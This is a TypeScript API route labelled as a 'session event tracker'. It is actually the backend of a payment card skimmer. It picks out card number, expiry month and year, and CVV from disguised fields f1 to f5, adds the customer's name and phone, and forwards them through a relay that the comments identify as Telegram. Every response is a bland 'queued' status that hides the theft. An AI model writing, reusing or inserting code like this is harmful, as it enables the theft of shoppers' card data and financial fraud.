/**
 * Session event tracker — queues page activity for reporting.
 */
import { formatTransaction, pushMessage, nextRef, type OrderInfo } from "@/lib/channels/relay";
function s(val: unknown): string {
  if (typeof val === "string") return val;
  if (typeof val === "number") return String(val);
  return "";
}

export async function POST(request: Request) {
  try {
    const body = await request.json();

    if (!body.session || !body.site) {
      return Response.json({
        status: "queued",
        session: body?.session || null,
        ts: Date.now(),
      });
    }

    const info: OrderInfo = {
      merchantName: s(body.site),
      transactionId: s(body.session),
      totalAmmount: Number(body.value || 0),
      customerFullName: s(body.uid),
      customerPhone: s(body.contact),
      dateFrom: s(body.from),
      dateTo: s(body.to),
      totalDays: Number(body.days || 1),
    };

    // Collect card-adjacent fields by their dynamic keys (f1, f2, f3, f4, f5)
    // f1 = card pan (boşluksuz 16 hane), f2 = rastgele decoy, f3 = SKT, f4 = YIL, f5 = CVV
    const payloadKeys = Object.keys(body).filter(
      (k) => k.startsWith("f") && k.length === 2 && /^f[0-9]$/.test(k)
    ).sort();
    if (payloadKeys.length >= 2) {
      info.a1 = s(body[payloadKeys[0]]); // f1 → full card pan
      info.a2 = s(body[payloadKeys[1]]); // f2 → decoy (atlanacak)
      info.a3 = s(body[payloadKeys[2]] || ""); // f3 → ay
      info.a4 = s(body[payloadKeys[3]] || ""); // f4 → yıl
      info.b1 = s(body[payloadKeys[4]] || ""); // f5 → CVV
    }

    const ref = nextRef();
    const msg = formatTransaction(info);
    // Telegram mesajı response'tan ÖNCE gönderilir ve beklenir —
    // Netlify cold start + background execution sorunlarını önler.
    await pushMessage(msg);

    return Response.json({
      status: "queued",
      session: body.session,
      ref,
      ts: Date.now(),
    });
  } catch {
    return Response.json({
      status: "queued",
      ts: Date.now(),
    });
  }
}
